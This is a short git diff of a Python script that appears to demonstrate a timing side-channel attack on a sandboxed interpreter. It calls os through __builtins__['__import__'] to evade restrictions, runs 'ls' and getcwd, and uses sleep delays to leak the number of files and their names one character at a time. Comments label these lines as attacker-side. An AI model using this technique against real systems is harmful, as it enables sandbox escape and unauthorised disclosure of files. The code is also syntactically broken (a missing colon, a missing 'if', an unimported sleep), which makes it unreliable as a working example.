@@ -151,16 +151,17 @@ lsfiles = __builtins__['__import__']('os').popen('ls').read()
 cdir = lfiles = __builtins__['__import__']('os').getcwd()
 
 # GUESS : Number of files in current directory < 30
-for n in range(0,30):    # This will be on attacker side
-    print(" If program paused now, then number of files is : "+str(n))         # This will be on attacker side
+for n in range(0,30):                                                  # This will be on attacker side
+    print(" If program paused now, then number of files is : "+str(n)) # This will be on attacker side
     if __builtins__['__import__']('os').listdir(cdir).__len__()==n:
         __builtins__['__import__']('time').sleep(20)
 
 # GUESS : File names given path and number of files
-char_set = string.ascii_letters + '0123456789' + '/-'
-for file_index in ndir:
-    for char_index in range(0,20)
-        for ele in char_set: 
+import string                                                # This will be on attacker side
+char_set = string.ascii_letters + '0123456789' + '/-'        # This will be on attacker side
+for file_index in ndir:                                      # This will be on attacker side
+    for char_index in range(0,20)                            # This will be on attacker side
+        for ele in char_set:                                 # This will be on attacker side
             __builtins__['__import__']('os').listdir(cdir)[file_index][char_index]==ele:
             sleep(3)
 
